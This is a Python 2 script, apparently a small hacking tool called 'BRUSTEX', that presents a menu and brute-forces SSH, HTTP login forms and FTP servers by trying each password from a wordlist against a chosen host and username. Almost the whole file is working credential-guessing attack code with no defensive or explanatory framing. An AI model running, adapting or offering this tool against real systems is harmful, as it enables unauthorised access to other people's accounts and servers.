import requests
import paramiko
import sys
import getopt
from termcolor import colored 
from ftplib import FTP

def main():
    print colored("%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n\n","blue")
    print colored("\t\t\t BRUSTEX\n\n","blue")
    print colored("\n\t\t\tby @luffy27\n\n","blue")
    print colored("%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n\n","blue")
    print colored("[1]for ssh brute force\n","blue")
    print colored("[2]for http brue force\n","blue")
    print colored("[3]for ftp brue force\n","blue")
    choice=input("enter your choice:\n")
    if choice==1:
        ssh_brute()
    elif choice==2:
        http_brute()
    elif choice==3:
        ftp_brute()
    else:
        print("Invalid choice")
        
def ssh_brute():
    u=raw_input("enter username\n")
    p=raw_input("enter the password file\n")
    h=raw_input("enter the host ip\n")
    words=list()
    file=open(p,"rb")
    found=False
    cred=""
    for i in file.readlines():
        strn=str(i.rstrip())
        words.append(strn)
    for word in words:
        try:
            print "trying ",u," with ",word
            client=paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(h,username=u,password=word)
            found=True
            cred=word
        except Exception as e:
            print(e)
            found=False
            cred=""
            
        if cred!="":
            print colored("Found: ","green"),colored(cred,"green")
            break
        
    if not found:
        print colored("No valid password found!!","red")
    file.close()
    
def http_brute():
    p=raw_input("enter the parameter to be tested\n")
    ul=raw_input("enter the url login page\n")
    u=raw_input("enter username file\n")
    pas=raw_input("enter the password file\n") 
    pos=raw_input("enter the positive feedback message\n")
    
    words=list()
    file=open(pas,"r")
    cred=""
    users=list()
    file1=open(u,"r")
    cred1=""
    
    for i in file.readlines():
        strn=str(i.rstrip())
        words.append(strn)
        
    for j in file1.readlines():
        strn=str(j.rstrip())
        users.append(strn)
    for user in users:
        for word in words:
            print "trying ",user," with ",word
            res=requests.post(ul,data={"username":user,p:word})
            if res.status_code==302 or pos in res.text:
                cred=word
                break
        
    if cred!="":
        print colored("Found","green"),colored(cred,"green")
    else:
        print colored("No password found","red")
    file.close() 
            
def ftp_brute():
    u=raw_input("enter username\n")
    p=raw_input("enter the password file\n")
    h=raw_input("enter the host ip\n")
    words=list()
    file=open(p,"rb")
    found=False
    cred=""
    for i in file.readlines():
        strn=str(i.rstrip())
        words.append(strn)
    for word in words:
        try:
            print "trying ",u," with ",word
            ftp=FTP(h)
            ftp.login(u,word)
            cred=word
            found=True
        except Exception as e:
            found=False
        if cred!="":
            print colored("found","green"),colored(cred,"green")
            break
        
    if not found:
        print("No cred found")
            
    
        
main()
